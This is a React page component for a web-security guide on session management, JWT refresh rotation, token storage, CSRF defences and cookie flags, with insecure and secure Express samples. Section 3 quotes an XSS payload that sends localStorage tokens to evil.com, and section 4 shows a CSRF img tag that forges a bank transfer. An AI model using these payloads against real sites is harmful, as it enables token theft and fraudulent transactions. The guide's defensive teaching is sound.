import Card from '../components/Card'
import CodeBlock from '../components/CodeBlock'
import Note from '../components/Note'
import BackToTop from '../components/BackToTop'

export default function TokenSecurity() {
  return (
    <>
      <div className="topic">
        <div className="topic-header prd">
          <div className="topic-tag prd">🛡️ Security Patterns</div>
          <h1>Token &amp; Session<br/>Security Playbook</h1>
          <p>Every auth decision you make — where to store tokens, how long sessions live, how to rotate secrets — is a security boundary. This guide walks each pattern with plain-English explanations, working code, and honest ratings.</p>
          <div className="topic-stats">
            <div className="t-stat"><span className="t-stat-ico">🔐</span><div><div className="t-stat-val">5</div><div className="t-stat-lbl">Patterns</div></div></div>
            <div className="t-stat"><span className="t-stat-ico">📦</span><div><div className="t-stat-val">12+</div><div className="t-stat-lbl">Code Examples</div></div></div>
            <div className="t-stat"><span className="t-stat-ico">🎯</span><div><div className="t-stat-val">XSS</div><div className="t-stat-lbl">Primary Threat</div></div></div>
          </div>
        </div>
      </div>

      <div className="topic-divider"><hr/></div>

      <div className="topic">

        {/* ───────────── 1. Session Management ───────────── */}
        <Card icon="🏨" bgColor="#e0f2fe" title="1 — Session Management" subtitle="Analogy: A hotel gives you a key card — not a key to every room.">
          <p className="body" style={{ marginBottom: '16px' }}>
            <strong>What it is:</strong> A session is a server-side record linked to a client via a session ID stored in a cookie. When you log in, the server creates a session, sends you the ID, and on every request you present that ID so the server knows who you are.
          </p>
          <p className="body" style={{ marginBottom: '16px' }}>
            <strong>Why it matters:</strong> If an attacker steals a session ID, they hijack that user's account. Session management is your last line of defence after authentication.
          </p>

          <Note type="warning" icon="⚡" title="Attack Vector: Session Hijacking">
            Stolen session ID → full account access. No password needed.&ensp;Protect with: HttpOnly + Secure + SameSite cookies, session regeneration on login, short expiry.
          </Note>

          <h3 className="lbl">Insecure — Session ID never changes</h3>
          <CodeBlock lang="javascript" code={`// ❌ Session ID stays the same forever
app.post('/login', async (req, res) => {
  const user = await db.user.findUnique({ where: { email: req.body.email } });
  req.session.userId = user.id;
  // No session.regenerate() — vulnerable to session fixation
  res.redirect('/dashboard');
});`} />

          <h3 className="lbl">Secure — Regenerate on privilege change ✅</h3>
          <CodeBlock lang="javascript" code={`// ✅ Regenerate session ID after login
app.post('/login', async (req, res) => {
  const user = await db.user.findUnique({ where: { email: req.body.email } });
  
  req.session.regenerate((err) => {        // ⚠️ Kills old session, creates new ID
    if (err) return next(err);
    req.session.userId = user.id;
    req.session.createdAt = Date.now();
    res.redirect('/dashboard');
  });
});

// ✅ Also regenerate on password change / privilege escalation
app.post('/change-password', (req, res) => {
  req.session.regenerate(() => {
    // ... proceed
  });
});`} />

          <h3 className="lbl">Recommended: Express Session Config</h3>
          <CodeBlock lang="javascript" code={`import session from 'express-session';
import connectRedis from 'connect-redis';
import RedisStore from 'connect-redis';

app.use(session({
  store: new RedisStore({ client: redisClient }),
  name: '__Host-sid',                    // ✅ Prefix prevents domain override
  secret: process.env.SESSION_SECRET,     // ✅ At least 64-char random string
  resave: false,
  saveUninitialized: false,               // ✅ Don't create sessions for unauthed users
  cookie: {
    httpOnly: true,                       // ✅ JS can't read it
    secure: true,                         // ✅ HTTPS only
    sameSite: 'lax',                      // ✅ CSRF protection
    maxAge: 24 * 60 * 60 * 1000,          // 24 hours
  },
}));`} />

          <Note type="info" icon="📊" title="Rating: 8/10 — Solid for most apps">
            <strong>Pros:</strong> Simple to implement, server-side revocation, works without JS.&ensp;
            <strong>Cons:</strong> Server memory/storage cost, less mobile-friendly, scaling requires shared session store (Redis).&ensp;
            <strong>10/10 would add:</strong> Session revocation API, rotation on every sensitive action, anomaly detection on session usage (geo/IP mismatch).
          </Note>
        </Card>

        {/* ───────────── 2. JWT Best Practices ───────────── */}
        <Card icon="🛂" bgColor="#fef3c7" title="2 — JWT: When & How" subtitle="Analogy: A passport — signed by an authority, readable by anyone, but tamper-proof.">
          <p className="body" style={{ marginBottom: '16px' }}>
            <strong>What it is:</strong> A JSON Web Token is a self-contained token with a payload (user ID, roles, expiry) and a cryptographic signature. Unlike sessions, JWTs are stateless — the server doesn't need to store them.
          </p>
          <p className="body" style={{ marginBottom: '16px' }}>
            <strong>Why it matters:</strong> JWTs scale effortlessly (no session store needed) but trade that for harder revocation. Once issued, a JWT is valid until it expires — you can't "kill" it server-side without a blocklist.
          </p>

          <Note type="danger" icon="🚨" title="Attack Vector: JWT Theft">
            Stolen JWT = full access until expiry.&ensp;Mitigate with: short expiry (≤15 min), refresh tokens, store in HttpOnly cookie (never localStorage), rotate signing keys regularly.
          </Note>

          <h3 className="lbl">Good — Short-lived access + long-lived refresh</h3>
          <CodeBlock lang="javascript" code={`import jwt from 'jsonwebtoken';

// GOOD: 7-day token, single secret
const token = jwt.sign(
  { userId: user.id, role: user.role },
  process.env.JWT_SECRET,
  { expiresIn: '7d' }
);
// ⚠️ 7 days is too long. If stolen, attacker has a week.`} />

          <h3 className="lbl">Better — Short access token + refresh token</h3>
          <CodeBlock lang="javascript" code={`// BETTER: Access token = 15 min, Refresh token = 7 days
const accessToken = jwt.sign(
  { userId: user.id, role: user.role, type: 'access' },
  process.env.JWT_ACCESS_SECRET,
  { expiresIn: '15m' }                    // ✅ Short window limits damage
);

const refreshToken = jwt.sign(
  { userId: user.id, type: 'refresh' },
  process.env.JWT_REFRESH_SECRET,          // ✅ Different secret from access token
  { expiresIn: '7d' }
);

// Refresh endpoint
app.post('/auth/refresh', async (req, res) => {
  const token = req.cookies.refreshToken;
  if (!token) return res.status(401).json({ error: 'Missing refresh token' });
  
  try {
    const decoded = jwt.verify(token, process.env.JWT_REFRESH_SECRET);
    if (decoded.type !== 'refresh') throw new Error('Wrong token type');
    
    const newAccess = jwt.sign(
      { userId: decoded.userId, type: 'access' },
      process.env.JWT_ACCESS_SECRET,
      { expiresIn: '15m' }
    );
    res.json({ accessToken: newAccess });
  } catch {
    res.status(401).json({ error: 'Invalid or expired refresh token' });
  }
});`} />

          <h3 className="lbl">Best — Rotation + Reuse Detection</h3>
          <CodeBlock lang="javascript" code={`// BEST: Rotate refresh token on every use + detect stolen tokens
app.post('/auth/refresh', async (req, res) => {
  const oldToken = req.cookies.refreshToken;
  if (!oldToken) return res.status(401).json({ error: 'Unauthorized' });

  let payload;
  try {
    payload = jwt.verify(oldToken, process.env.JWT_REFRESH_SECRET);
  } catch {
    return res.status(401).json({ error: 'Invalid token' });
  }

  const storedHash = await redis.get(\`refresh:\${payload.userId}\`);
  
  if (!storedHash) {
    // ❌ Token already rotated — possible theft
    await redis.del(\`refresh:\${payload.userId}\`);  // Invalidate ALL sessions
    return res.status(401).json({ error: 'Token reuse detected' });
  }

  const tokenHash = crypto.createHash('sha256').update(oldToken).digest('hex');
  if (tokenHash !== storedHash) {
    // ❌ Different token presented — likely theft
    await redis.del(\`refresh:\${payload.userId}\`);
    return res.status(401).json({ error: 'Token mismatch' });
  }

  // ✅ Issue new refresh token, delete old one
  const newRefresh = jwt.sign(
    { userId: payload.userId, type: 'refresh' },
    process.env.JWT_REFRESH_SECRET,
    { expiresIn: '7d' }
  );
  
  const newHash = crypto.createHash('sha256').update(newRefresh).digest('hex');
  await redis.set(\`refresh:\${payload.userId}\`, newHash, 'EX', 7 * 86400);

  const accessToken = jwt.sign(
    { userId: payload.userId, type: 'access' },
    process.env.JWT_ACCESS_SECRET,
    { expiresIn: '15m' }
  );

  res.json({ accessToken });
});`} />

          <Note type="info" icon="📊" title="Rating: 8/10 — Token Rotation + Detection">
            <strong>Pros:</strong> Stateless access tokens, scalable, rotation detects theft.&ensp;
            <strong>Cons:</strong> Requires Redis for refresh token tracking (now stateful again), more complex than sessions, easy to get rotation wrong.&ensp;
            <strong>10/10 would add:</strong> JWT binding to client fingerprint (TLS client cert or JWK thumbprint), automatic revocation on password change, short-lived access tokens (≤5 min) for high-risk apps.
          </Note>
        </Card>

        {/* ───────────── 3. Token Storage ───────────── */}
        <Card icon="📮" bgColor="#dcfce7" title="3 — Token Storage: Where to Put JWTs" subtitle="Analogy: localStorage is a postcard — everyone can read it. HttpOnly cookies are a sealed envelope.">
          <p className="body" style={{ marginBottom: '16px' }}>
            <strong>What it is:</strong> Once your server issues a JWT, the browser needs to keep it somewhere and send it with every request. The two options are localStorage and cookies — and they are not equivalent.
          </p>
          <p className="body" style={{ marginBottom: '16px' }}>
            <strong>Why it matters:</strong> The storage location determines which attacks can steal the token. This single decision is the most common cause of token theft in real-world apps.
          </p>

          <Note type="danger" icon="💀" title="Attack Vector: XSS">
            One XSS vulnerability is all it takes to empty localStorage and exfiltrate every token.&ensp;HttpOnly cookies are immune to this because JavaScript <em>cannot read them at all</em>.
          </Note>

          <h3 className="lbl">Never ❌ — localStorage for tokens</h3>
          <CodeBlock lang="javascript" code={`// ❌ NEVER store tokens in localStorage
const token = jwt.sign({ userId: user.id }, process.env.JWT_SECRET);
localStorage.setItem('access_token', token);
// Any XSS: <script>fetch('https://evil.com/steal?t='+localStorage.getItem('access_token'))</script>
// You've lost everything. No CSP can fully prevent this.`} />

          <h3 className="lbl">Correct ✅ — HttpOnly cookies</h3>
          <CodeBlock lang="javascript" code={`// ✅ Store JWTs in HttpOnly, Secure, SameSite cookies
res.cookie('accessToken', token, {
  httpOnly: true,                         // ⚠️ JS cannot read or modify this cookie
  secure: true,                           // ✅ HTTPS only
  sameSite: 'strict',                     // ✅ Won't send on cross-site requests
  path: '/api',                           // ✅ Limit scope
  maxAge: 15 * 60 * 1000,                 // 15 minutes
});

// The cookie is sent automatically with every request to /api/*
// JS never touches it. Even if an XSS payload runs, it can't steal it.`} />

          <h3 className="lbl">Best (10/10) ✅ — BFF Pattern (Backend for Frontend)</h3>
          <CodeBlock lang="javascript" code={`// BEST: Token never reaches the browser at all
// The BFF proxy holds the token and attaches it server-side

// Frontend → BFF (same-origin) → External API
// Browser only gets a regular session cookie (HttpOnly)
// No JWTs in browser memory, no JWTs in cookies, no tokens anywhere on the client

// On the BFF server:
app.post('/api/proxy', async (req, res) => {
  // BFF retrieves the token from its own session store
  const accessToken = req.session.accessToken;
  
  // BFF attaches the token server-side
  const response = await fetch('https://api.example.com/data', {
    headers: { Authorization: \`Bearer \${accessToken}\` },
  });
  
  // BFF returns only the data to the browser
  const data = await response.json();
  res.json(data);
});

// Browser never sees the JWT. Ever.`} />

          <Note type="info" icon="📊" title="Rating: 10/10 — BFF Pattern (Token never touches browser)">
            <strong>Pros:</strong> Eliminates token theft via XSS entirely, clean separation, works with any backend.&ensp;
            <strong>Cons:</strong> Requires a BFF server (extra infra), adds latency per request, more complex to set up.&ensp;
            <strong>Verdict:</strong> Overkill for most apps, but if you handle financial data, healthcare records, or anything that would get you sued if leaked — do this.
          </Note>
        </Card>

        {/* ───────────── 4. CSRF & SameSite ───────────── */}
        <Card icon="🔄" bgColor="#fce7f3" title="4 — CSRF Protection & SameSite Cookies" subtitle="Analogy: You wouldn't let a stranger hand your signed cheque to the bank — why let a random site submit forms on your behalf?">
          <p className="body" style={{ marginBottom: '16px' }}>
            <strong>What it is:</strong> Cross-Site Request Forgery tricks a logged-in user into performing an action on your site (change email, transfer money) by submitting a form from a malicious site. The victim's browser happily includes their cookies with the forged request.
          </p>
          <p className="body" style={{ marginBottom: '16px' }}>
            <strong>Why it matters:</strong> If your API uses cookies for auth and you don't protect against CSRF, any random website can make your users do things without their knowledge.
          </p>

          <Note type="warning" icon="⚡" title="Attack Vector: CSRF">
            <code>&lt;img src="https://bank.com/api/transfer?to=attacker&amp;amount=10000" /&gt;</code> — that one line in a forum post triggers a transfer if the user is logged in.&ensp;Mitigate with: SameSite=Strict/Lax cookies, CSRF tokens, Origin/Referer header validation.
          </Note>

          <h3 className="lbl">Good — SameSite cookie attribute</h3>
          <CodeBlock lang="javascript" code={`// GOOD: Browser-level CSRF protection
res.cookie('session', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',            // ✅ Blocks cross-site POST (the most dangerous)
  // 'strict' is stronger but breaks OAuth redirects
});

// How it works:
// - 'strict': Cookie never sent on cross-site requests. Breaks "Log in with Google" redirect.
// - 'lax':  ✅ Cookie sent for top-level GET navigations (safe). Blocks POST from other sites.
// - 'none': Cookie sent on all cross-site requests. Requires Secure flag. No CSRF protection.`} />

          <h3 className="lbl">Better — CSRF tokens for state-changing requests</h3>
          <CodeBlock lang="javascript" code={`// BETTER: Server-issued CSRF token
import csrf from 'csrf';
const tokens = new csrf();

// Generate token, send to client
app.get('/api/csrf-token', (req, res) => {
  const secret = req.session.csrfSecret || tokens.secretSync();
  req.session.csrfSecret = secret;
  res.json({ csrfToken: tokens.create(secret) });
});

// Validate on every state-changing request
app.post('/api/transfer', (req, res) => {
  if (!tokens.verify(req.session.csrfSecret, req.body.csrfToken)) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  // Proceed with transfer
});`} />

          <h3 className="lbl">Best — Double-submit cookie pattern (SPAs)</h3>
          <CodeBlock lang="javascript" code={`// BEST for SPAs: Double-submit cookie
// Server sets a random CSRF cookie (not HttpOnly — JS needs to read it)
// Frontend reads it and sends it as a custom header

// Server-side middleware
app.use('/api', (req, res, next) => {
  if (!req.cookies['X-CSRF-Token']) {
    const token = crypto.randomBytes(32).toString('hex');
    res.cookie('X-CSRF-Token', token, {
      secure: true,
      sameSite: 'strict',
      maxAge: 24 * 60 * 60 * 1000,
    });
  }
  next();
});

// Validate on state-changing requests
app.post('/api/transfer', (req, res) => {
  const cookieToken = req.cookies['X-CSRF-Token'];
  const headerToken = req.headers['x-csrf-token'];
  
  if (!cookieToken || !headerToken || cookieToken !== headerToken) {
    return res.status(403).json({ error: 'CSRF validation failed' });
  }
  // Proceed
});

// On the frontend:
const csrfToken = getCookie('X-CSRF-Token');
fetch('/api/transfer', {
  method: 'POST',
  headers: { 'X-CSRF-Token': csrfToken, 'Content-Type': 'application/json' },
  body: JSON.stringify({ amount: 100, to: 'savings' }),
});`} />

          <Note type="info" icon="📊" title="Rating: 9/10 — SameSite=Lax + CSRF Tokens">
            <strong>Pros:</strong> Defense in depth, works with or without JS, browser-enforced and server-enforced.&ensp;
            <strong>Cons:</strong> SameSite 'strict' breaks OAuth flows; CSRF tokens add complexity to SPAs.&ensp;
            <strong>10/10 would add:</strong> Origin header validation as third layer (check Origin matches your domain), request signing for high-value transactions.
          </Note>
        </Card>

        {/* ───────────── 5. Secure Cookie Configuration ───────────── */}
        <Card icon="🍪" bgColor="#ffedd5" title="5 — Secure Cookie Configuration" subtitle="One missing flag can undo every other security measure.">
          <p className="body" style={{ marginBottom: '16px' }}>
            <strong>What it is:</strong> Cookies have flags that control who can read them, when they're sent, and where they're valid. Setting them wrong is the single most common security gap in auth implementations.
          </p>

          <Note type="danger" icon="🚨" title="Attack Vectors: Multiple">
            <code>httpOnly=false</code> → XSS can read your session.&ensp;
            <code>secure=false</code> → MITM on HTTP captures the cookie.&ensp;
            <code>sameSite=none</code> → CSRF attacks.&ensp;
            <code>domain=example.com</code> → Subdomain XSS leaks the cookie to attacker-controlled subdomain.
          </Note>

          <h3 className="lbl">The Perfect Cookie Config ✅</h3>
          <CodeBlock lang="javascript" code={`// ✅ THE GOLD STANDARD — Session cookie
res.cookie('session', sessionId, {
  httpOnly: true,           // ⚠️ JS can't read it — XSS protection
  secure: true,             // ⚠️ Only sent over HTTPS — MITM protection
  sameSite: 'lax',          // ⚠️ Blocks CSRF on POST/PUT/DELETE
  path: '/api',             // Limits where the cookie is sent
  maxAge: 24 * 60 * 60 * 1000,   // 24 hours
});

// ✅ THE GOLD STANDARD — Refresh token cookie
res.cookie('refreshToken', refreshToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',       // Even stricter for refresh tokens
  path: '/api/auth/refresh',// Only sent to refresh endpoint
  maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days
});

// ✅ Host-only cookie (most restrictive)
// Use __Host- prefix to require: secure=true, path=/, no domain attribute
res.cookie('__Host-session', sessionId, {
  httpOnly: true,
  secure: true,              // Required by __Host- prefix
  path: '/',                 // Required by __Host- prefix
  sameSite: 'lax',
  maxAge: 24 * 60 * 60 * 1000,
});
// The browser will REJECT this cookie if:
// - secure is missing
// - path is not /
// - a domain attribute is set`} />

          <h3 className="lbl">Cookie Flags Cheat Sheet</h3>
          <div className="tbl-wrap">
            <table>
              <thead>
                <tr><th>Flag</th><th>What it does</th><th>Set to</th><th>Attack it prevents</th></tr>
              </thead>
              <tbody>
                <tr><td><code>httpOnly</code></td><td>Forbids JS access via document.cookie</td><td><code>true</code></td><td>XSS token theft</td></tr>
                <tr><td><code>secure</code></td><td>Only sends cookie over HTTPS</td><td><code>true</code></td><td>MITM / network sniffing</td></tr>
                <tr><td><code>sameSite</code></td><td>Controls cross-site request behavior</td><td><code>'lax'</code> or <code>'strict'</code></td><td>CSRF</td></tr>
                <tr><td><code>path</code></td><td>Limits which paths the cookie is sent to</td><td>Narrowest possible</td><td>Scope creep / other endpoints</td></tr>
                <tr><td><code>domain</code></td><td>Controls which domains receive the cookie</td><td>Omit (host-only)</td><td>Subdomain takeover</td></tr>
                <tr><td><code>maxAge</code></td><td>Cookie lifetime in ms</td><td>Shortest practical</td><td>Stale token reuse</td></tr>
              </tbody>
            </table>
          </div>

          <Note type="info" icon="📊" title="Rating: 10/10 — When all flags are set correctly">
            <strong>Pros:</strong> Defense in depth from browser-enforced rules, works automatically without JS, __Host- prefix adds fail-closed protection.&ensp;
            <strong>Cons:</strong> None, if set correctly. This is table stakes — there is no excuse for missing flags in 2026.&ensp;
            <strong>Verdict:</strong> Use a cookie config function that applies these by default. Never set cookies manually.
          </Note>
        </Card>

        <Note type="teal" icon="🎯" title="Bottom Line">
          <strong>1.</strong> Never localStorage for tokens — always HttpOnly cookies.&ensp;
          <strong>2.</strong> Short-lived access tokens (≤15 min) + rotating refresh tokens.&ensp;
          <strong>3.</strong> SameSite=Lax is the minimum; add CSRF tokens for sensitive operations.&ensp;
          <strong>4.</strong> Regenerate session IDs on any privilege change.&ensp;
          <strong>5.</strong> Every cookie flag matters — use a single source of truth for cookie config.
        </Note>
      </div>

      <BackToTop />
    </>
  )
}
